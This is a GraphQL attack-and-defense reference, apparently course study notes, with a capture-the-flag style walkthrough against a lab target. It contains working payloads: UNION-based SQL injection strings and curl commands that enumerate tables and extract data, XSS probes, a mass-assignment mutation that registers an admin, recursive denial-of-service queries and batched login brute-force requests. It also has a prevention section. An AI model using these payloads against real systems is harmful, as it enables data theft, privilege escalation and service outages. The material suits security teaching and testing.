# GraphQL Security: Attack and Defense Reference

A hands-on guide to attacking and securing GraphQL APIs. It covers endpoint fingerprinting, introspection, injection (SQLi and XSS), denial of service through recursive schemas, batching abuse, mutation-based privilege escalation, the main tooling, a defense framework, and a full skills-assessment walkthrough.

---

## Table of Contents

1. [Introduction to GraphQL](#1-introduction-to-graphql)
2. [Information Disclosure](#2-information-disclosure)
3. [Injection Attacks](#3-injection-attacks)
4. [DoS and Batching Attacks](#4-dos-and-batching-attacks)
5. [Mutations and Privilege Escalation](#5-mutations-and-privilege-escalation)
6. [Tools](#6-tools)
7. [Vulnerability Prevention](#7-vulnerability-prevention)
8. [Skills Assessment Walkthrough](#8-skills-assessment-walkthrough)
9. [Quick Reference Cheat Sheet](#9-quick-reference-cheat-sheet)

---

## 1. Introduction to GraphQL

GraphQL is a query language for web APIs and an alternative to REST. The client requests exactly the data it needs. Operations come in three types: **query** (read), **mutation** (write), and **subscription** (live updates). Most deployments expose a single endpoint, usually `/graphql` or `/api/graphql`.

| REST | GraphQL |
|---|---|
| Many endpoints | One endpoint |
| Fixed responses | Client selects fields |
| Often over-fetches | Precise fetching |

```graphql
query {
  users {
    id
    username
    role
  }
}
```

This returns only the three requested fields for every user.

### Security angle

- One exposed endpoint means one large attack surface.
- Introspection can reveal the entire schema.
- The client controls the shape of the request, which gives attackers a lot of leverage.

---

## 2. Information Disclosure

### Step 1: Identify the endpoint

Watch network traffic for `/graphql`, `/api/graphql`, or similar paths. To confirm and fingerprint the engine, use graphw00f:

```bash
git clone https://github.com/dolevf/graphw00f.git
cd graphw00f
python3 main.py -d -f -t http://TARGET
```

| Flag | Meaning |
|---|---|
| `-d` | Detect mode |
| `-f` | Fingerprint mode |
| `-t` | Target base URL |

Example output:

```text
[!] Found GraphQL at http://TARGET/graphql
[*] Discovered GraphQL Engine: (Graphene)
```

Different engines ship with different security defaults, so fingerprinting shapes the rest of the test. The GraphQL Threat Matrix (https://github.com/nicholasaleks/graphql-threat-matrix) is a useful reference.

Graphene defaults, a common finding:

- Field suggestions: enabled
- Introspection: enabled
- Query depth limit: not supported
- Query cost analysis: not supported
- Batch requests: disabled by default

### Step 2: Introspection

Introspection queries the API about its own schema through `__schema` and `__type`.

List all types:

```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

Inspect the fields of a type:

```graphql
{
  __type(name: "UserObject") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

This often leaks sensitive fields such as `username`, `password`, or `role`.

List all query entry points:

```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

The standard `IntrospectionQuery` dumps the full schema, including types, fields, queries, mutations, subscriptions, directives, enums, and input values.

### Step 3: Visualize with GraphQL Voyager

GraphQL Voyager renders the schema as a graph. A public demo is at https://graphql-kit.com/graphql-voyager/. Use "Change schema," then "Introspection," paste the JSON, and display it.

On a real engagement, host Voyager locally. Never paste client data into a public demo.

From the diagram, look for:
- **Sensitive fields** such as `password` or `secret`
- **Cycles between types** (for example, User and Post), which are a DoS surface
- **Arguments on queries**, which are an injection surface

---

## 3. Injection Attacks

### Finding argument-taking queries

Get the list from introspection, or find it by trial and error.

| Query | Argument | Type |
|---|---|---|
| `post` | `id` | Int |
| `user` | `username` | String |
| `postByAuthor` | `author` | String |

To find a missing argument, send the query without arguments. The error usually names the required argument.

### SQL injection

**Probe 1: comment payload.**

```graphql
{ postByAuthor(author: "admin --") { id title } }
```

A `null` result suggests the input is parameterized and not injectable.

**Probe 2: comment payload on a different query.**

```graphql
{ user(username: "htb-stdnt --") { uuid username role } }
```

If the user still comes back, `--` commented out the rest of the SQL. The query is injectable.

**Probe 3: single quote.**

```graphql
{ user(username: "htb-stdnt'") { uuid username role } }
```

A SQL syntax error confirms raw string concatenation.

**Building a UNION payload.** The column count must match the number of fields in the returned object. `UserObject` has six fields (`uuid`, `id`, `username`, `password`, `role`, `msg`), so the UNION needs six columns. A field's position in the object is also its column position. Since `username` is the third field, the third UNION column is what appears in the `username` output.

**Enumerate tables:**

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6
         FROM information_schema.tables
         WHERE table_schema=database()-- -") {
    username
  }
}
```

**Enumerate columns:**

```graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6
         FROM information_schema.columns
         WHERE table_name='flag'-- -") {
    username
  }
}
```

**Extract data:**

```graphql
{
  user(username: "x' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -") {
    username
  }
}
```

Key rules:
- `GROUP_CONCAT` dumps multiple rows in one request.
- `#` or `-- -` comments out the trailing `'` and any `LIMIT 1`.
- Always include `FROM <table>`. Without it, MySQL looks for the column in an implicit table and fails with an "Unknown column" error.

### Cross-site scripting (XSS)

XSS appears when query results or error messages reflect user input without encoding.

**Test 1: payload in a string argument.**

```graphql
{ user(username: "<script>alert(1)</script>") { username } }
```

A `null` result means the input was not reflected.

**Test 2: payload in an Int argument.**

```graphql
{ post(id: "<script>alert(1)</script>") { id title } }
```

The query errors, but the payload appears unencoded in the error message. That is potential reflected XSS.

**Reality check:** a reflected payload is not the same as working XSS. In the lab, a payload in `/post?id=...` broke the page without executing, because of HTML encoding and content-type context. Verify execution in the actual rendering context.

---

## 4. DoS and Batching Attacks

### DoS through a recursive schema

Look at the schema in Voyager. In the lab, the types formed a loop:

```text
UserObject --(author)--> PostObject
PostObject --(posts)---> UserObject
```

Because each level of nesting multiplies the response size, a cycle can produce an exponentially large response.

Basic loop query:

```graphql
{
  posts {
    author {
      posts {
        edges {
          node {
            author {
              username
            }
          }
        }
      }
    }
  }
}
```

`posts` is a Relay-style connection, so the query goes through `edges` and `node` to reach each `PostObject`.

Repeating the nesting 10 or more levels crashed GraphiQL in the lab with "Aw, Snap! Something went wrong while displaying this webpage. Error code: 4," which indicates the backend or browser ran out of memory.

| Factor | Detail |
|---|---|
| Root cause | Recursive schema (User and Post reference each other) |
| Amplifier | Nested repetition, producing exponential response size |
| Effect | High CPU and memory use, service unavailable |
| Defense | Depth limits, cost analysis, complexity scoring |

Graphene ships without depth limits or cost analysis, so it is vulnerable by default.

### Batching attacks

GraphQL can send several operations in one HTTP request as a JSON array. The response mirrors the input structure.

```http
POST /graphql HTTP/1.1
Content-Type: application/json

[
    { "query":"{ user(username: \"admin\") { uuid } }" },
    { "query":"{ post(id: 1) { title } }" }
]
```

Batching is an intended feature, not a vulnerability by itself. It becomes a risk when it is used on sensitive operations such as login or registration.

**Brute-force bypass.** Suppose login goes through GraphQL and the server limits clients to 5 HTTP requests per second.

| Without batching | With batching |
|---|---|
| 5 passwords per second | 1000 login attempts per request, which is 5000 per second |
| Rate limit holds | Rate limit defeated |

The rate limiter counts HTTP requests, not the GraphQL operations inside them.

```json
[
  {"query":"mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query":"mutation { login(username: \"admin\", password: \"pass2\") { token } }"}
]
```

| Aspect | Detail |
|---|---|
| What | Multiple operations in one HTTP request |
| Intended? | Yes |
| Risk | Rate limits bypassed if used for authentication |
| Defense | Disable batching on auth endpoints, or count operations per request |

---

## 5. Mutations and Privilege Escalation

Mutations are GraphQL's write operations (create, update, delete), defined under `mutationType` in the schema.

### Enumerate mutations

```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind name
  ofType {
    kind name
    ofType {
      kind name
      ofType {
        kind name
        ofType {
          kind name
          ofType {
            kind name
            ofType {
              kind name
            }
          }
        }
      }
    }
  }
}
```

In the lab, this revealed a `registerUser` mutation with an `input` argument of type `RegisterUserInput`.

### Enumerate the input object

```graphql
{
  __type(name: "RegisterUserInput") {
    name
    inputFields {
      name
      description
      defaultValue
    }
  }
}
```

The result listed `username`, `password`, `role`, and `msg`. The client could set `role` directly.

### Hash the password

The backend expected an MD5 hash:

```bash
echo -n 'password' | md5sum
# 5f4dcc3b5aa765d61d8327deb882cf99
```

### Register a normal user

```graphql
mutation {
  registerUser(input: {
    username: "vautia",
    password: "5f4dcc3b5aa765d61d8327deb882cf99",
    role: "user",
    msg: "newUser"
  }) {
    user { username password msg role }
  }
}
```

### Privilege escalation: register an admin

Set `role` to `admin`:

```graphql
mutation {
  registerUser(input: {
    username: "vautiaAdmin",
    password: "5f4dcc3b5aa765d61d8327deb882cf99",
    role: "admin",
    msg: "Hacked!"
  }) {
    user { username password msg role }
  }
}
```

The response reflects `"role": "admin"` back, which confirms the server accepted it. Logging in as that user and visiting `/admin` then shows the admin area.

### Attack chain summary

| Step | Action | Purpose |
|---|---|---|
| 1 | Introspect `mutationType` | Find `registerUser` |
| 2 | Introspect `RegisterUserInput` | Discover that `role` is client-controlled |
| 3 | MD5-hash a password | Meet the backend's format requirement |
| 4 | Register with `role: "admin"` | Escalate privileges |
| 5 | Log in and visit `/admin` | Confirm access |

### Why this is vulnerable

- **Mass assignment.** The server trusts a privileged field supplied by the client.
- **No authorization check.** Anyone can assign themselves the admin role.
- **Introspection enabled.** The full mutation surface was handed to the attacker.

---

## 6. Tools

| Tool | Type | Best for |
|---|---|---|
| graphw00f | CLI | Fingerprinting the GraphQL engine |
| GraphQL Voyager | Web | Visualizing the schema |
| GraphQL-Cop | CLI | Automated configuration audit |
| InQL | Burp extension | Schema exploration, query crafting, batch testing |

### GraphQL-Cop

```bash
git clone https://github.com/dolevf/graphql-cop.git
cd graphql-cop
pip3 install -r requirements.txt
python3 graphql-cop.py -v
python3 graphql-cop.py -t http://TARGET/graphql
```

Example findings from the lab:

| Severity | Finding | Category |
|---|---|---|
| High | Alias overloading (100+ aliases) | DoS |
| High | Array-based query batching | DoS |
| High | Directive overloading | DoS |
| High | Field duplication (500 repeats) | DoS |
| High | Introspection enabled | Information disclosure |
| Medium | GET method query support | Possible CSRF |
| Medium | POST with URL-encoded queries | Possible CSRF |
| Low | Field suggestions enabled | Information disclosure |
| Low | GraphiQL or Playground enabled | Information disclosure |

Treat High findings as likely exploitable and prioritize them.

### InQL (Burp extension)

Install it from the Burp BApp Store by searching for InQL. It adds:

- GraphQL tabs in Proxy history and Repeater, so you can edit queries without hand-writing JSON
- A context menu entry, Extensions, then InQL GraphQL Scanner
- Query generation and batch attacks
- An InQL tab per scanned host, with the full schema as ready-to-use `.graphql` files

### Recommended workflow

1. **graphw00f:** identify the engine and endpoint.
2. **Introspection:** dump the schema with curl or GraphiQL.
3. **GraphQL Voyager:** visualize relationships, and look for cycles that enable DoS.
4. **GraphQL-Cop:** run a quick automated audit.
5. **InQL:** craft and test queries and mutations in Burp.
6. **Manual exploitation:** SQLi, XSS, privilege escalation, DoS, batching.

---

## 7. Vulnerability Prevention

### The four pillars

```text
HIDE       disable introspection, return generic errors
VALIDATE   allowlist input, parameterize queries, encode output
LIMIT      depth, size, and rate limits; disable batching where possible
AUTHORIZE  authenticate the endpoint, authorize every query and mutation
```

### Information disclosure

| Defense | What it stops |
|---|---|
| Disable verbose error messages | SQL errors and stack traces leaking internals |
| Return generic error messages | Error-based reconnaissance |
| Disable introspection where possible | Full schema disclosure |
| Audit introspection results | If it must stay on, remove sensitive fields |

### Injection

Treat all user input as untrusted until it is validated.

| Defense | Details |
|---|---|
| Input validation | Validate every argument (username, author, id, role) |
| Sanitization | Encode output and use parameterized SQL |
| Allowlists over denylists | Permit known-good values only |
| Coverage | SQLi, command injection, XSS |

### DoS and batching

| Defense | Purpose |
|---|---|
| Query depth limit | Stops recursive nesting |
| Query size limit | Caps payload size |
| Rate limiting on the endpoint | Stops rapid successive queries |
| Disable batching where possible | Blocks brute-force amplification |
| Depth-limit batched requests if batching is required | Reduces the risk |

### API design

Apply least privilege throughout.

| Defense | What it stops |
|---|---|
| Authentication on `/graphql` | Unauthenticated access |
| Authorization checks on every query and mutation | Privilege escalation |
| Strict access control | IDOR and improper access control |
| Never trust client-supplied privileged fields | Mass assignment and role injection |

The lab's privilege escalation has a one-line fix: the server forces `role = "user"` on registration and never accepts a role from the client.

### Master defense table

| Attack | Root cause | Defense |
|---|---|---|
| Information disclosure | Introspection and verbose errors | Disable introspection; generic errors |
| SQLi | Unsanitized arguments concatenated into SQL | Parameterized queries; allowlists |
| XSS | Unencoded reflection | Output encoding; input validation |
| DoS | Recursive schema, no limits | Depth, size, and rate limits |
| Batching brute force | Rate limit counts HTTP requests | Disable batching; per-operation limits |
| Privilege escalation | Client-controlled role | Authorization checks; hard-coded role |
| IDOR | Missing authorization | Least privilege; auth on every operation |

For a production checklist, see the OWASP GraphQL Cheat Sheet.

---

## 8. Skills Assessment Walkthrough

**Scenario:** a GraphQL backend for a fictional company (Recovera Systems) remained online after its website was taken down. The goal is to find vulnerabilities in schema design, query handling, or data exposure.

**Target:** `http://TARGET:PORT/graphql`

### Stage 1: Recon

```bash
python3 main.py -d -f -t http://TARGET:PORT
```

```text
[!] Found GraphQL at http://TARGET:PORT/graphql
[*] Discovered GraphQL Engine: (Graphene)
```

### Stage 2: Enumerate queries

```bash
curl -s -X POST http://TARGET:PORT/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"Query\") { fields { name args { name type { name kind ofType { name kind } } } } } }"}' | jq
```

This revealed `activeApiKeys`, `allCustomers`, and `customerByName`.

### Stage 3: Retrieve an admin API key

```bash
curl -s -X POST http://TARGET:PORT/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ activeApiKeys { id role key } }"}' | jq
```

The response listed several keys with their roles. One key had the `admin` role. Store it in a shell variable, for example `ADMIN_KEY`, and do not paste it into reports or notes.

### Stage 4: Confirm SQL injection

Send a single quote through `customerByName`, passing the key and the last name as GraphQL variables:

```bash
curl -s -X POST http://TARGET:PORT/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query":"query($apiKey: String!, $lastName: String!) { customerByName(apiKey: $apiKey, lastName: $lastName) { firstName lastName address } }",
    "variables":{"apiKey":"'"$ADMIN_KEY"'","lastName":"hassan'"'"'"}
  }' | jq
```

The error leaked the underlying SQL:

```sql
SELECT customer.id, customer.firstName, customer.lastName, customer.address
FROM customer
WHERE lastName='hassan''
LIMIT 1
```

Findings from the error:
- Four columns (`id`, `firstName`, `lastName`, `address`), so the UNION needs four values.
- The table is `customer`.
- A trailing `LIMIT 1` needs to be commented out with `#` or `-- -`.

### Stage 5: Enumerate tables

```bash
curl -s -X POST http://TARGET:PORT/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query":"query($apiKey: String!, $lastName: String!) { customerByName(apiKey: $apiKey, lastName: $lastName) { firstName lastName address } }",
    "variables":{"apiKey":"'"$ADMIN_KEY"'","lastName":"'"'"' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema=database() # "}
  }' | jq
```

The result listed `api_key`, `employee`, `flag`, `product`, and `customer`.

### Stage 6: Enumerate columns of `flag`

```bash
curl -s -X POST http://TARGET:PORT/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query":"query($apiKey: String!, $lastName: String!) { customerByName(apiKey: $apiKey, lastName: $lastName) { firstName lastName address } }",
    "variables":{"apiKey":"'"$ADMIN_KEY"'","lastName":"'"'"' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='"'"'flag'"'"' # "}
  }' | jq
```

The result was `id,flag`.

### Stage 7: Extract the flag

Always include `FROM flag`. Omitting it produces `Unknown column 'flag' in 'field list'`.

```bash
curl -s -X POST http://TARGET:PORT/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query":"query($apiKey: String!, $lastName: String!) { customerByName(apiKey: $apiKey, lastName: $lastName) { firstName lastName address } }",
    "variables":{"apiKey":"'"$ADMIN_KEY"'","lastName":"'"'"' UNION SELECT 1,2,flag,4 FROM flag # "}
  }' | jq
```

To extract only the flag from the output:

```bash
... | grep -o 'HTB{[^}]*}'
```

### Attack chain summary

| Stage | Action | Result |
|---|---|---|
| 1 | Fingerprint | Graphene at `/graphql` |
| 2 | Enumerate queries | `activeApiKeys`, `customerByName`, and others |
| 3 | Dump API keys | Admin key exposed |
| 4 | Probe `customerByName` | SQLi confirmed; four-column SELECT |
| 5 | Enumerate tables | `flag` table found |
| 6 | Enumerate columns | `id`, `flag` |
| 7 | UNION SELECT from `flag` | Flag extracted |

---

## 9. Quick Reference Cheat Sheet

### Recon

```bash
# Fingerprint the engine
python3 main.py -d -f -t http://TARGET

# Enumerate the Query type
curl -s -X POST http://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"Query\") { fields { name args { name } } } }"}' | jq

# Enumerate the Mutation type
curl -s -X POST http://TARGET/graphql -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name } } } } }"}' | jq
```

### SQLi (GraphQL)

```graphql
# Detect: comment payload
{ user(username: "admin --") { uuid } }

# Detect: single quote produces an error
{ user(username: "admin'") { uuid } }

# Enumerate tables (match the column count)
{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6
       FROM information_schema.tables
       WHERE table_schema=database() # ") { username } }

# Enumerate columns
{ user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6
       FROM information_schema.columns
       WHERE table_name='flag' # ") { username } }

# Extract data (always include FROM <table>)
{ user(username: "x' UNION SELECT 1,2,flag,4,5,6 FROM flag # ") { username } }
```

### Privilege escalation (mutations)

```graphql
# Mass assignment: register as admin
mutation {
  registerUser(input: {
    username: "pwn",
    password: "5f4dcc3b5aa765d61d8327deb882cf99",
    role: "admin",
    msg: "hacked"
  }) { user { username role } }
}
```

### DoS (recursive query)

```graphql
{ posts { author { posts { edges { node { author { posts { edges {
  node { author { username } }
} } } } } } } } }
```

### Batching brute force

```json
[
  {"query":"mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query":"mutation { login(username: \"admin\", password: \"pass2\") { token } }"}
]
```

### Key rules

- Introspect first. It reveals every query, mutation, field, and argument.
- For a UNION injection, the column count must equal the number of fields in the returned object.
- The Nth field is the Nth column in the reflected output.
- `GROUP_CONCAT` dumps multiple rows at once.
- `#` or `-- -` comments out the trailing SQL.
- Always include `FROM <table>` in a UNION SELECT, or MySQL searches the implicit table.
- Object fields need sub-selections. `{ secrets }` fails, but `{ secrets { secret } }` works.
- Mutations that accept a role from the client are a privilege escalation surface.
- Recursive schema cycles are a DoS surface.
- Batching can bypass rate limits on brute-force targets.

### The four pillars of GraphQL defense

```text
HIDE       disable introspection, generic errors
VALIDATE   allowlist input, parameterized queries, encode output
LIMIT      depth, size, rate limits, disable batching
AUTHORIZE  authentication on the endpoint, authorization on every operation
```

---

**Core methodology:** introspect, find arguments, probe with `'` and comment sequences, count columns, UNION with `GROUP_CONCAT` to enumerate, then extract.
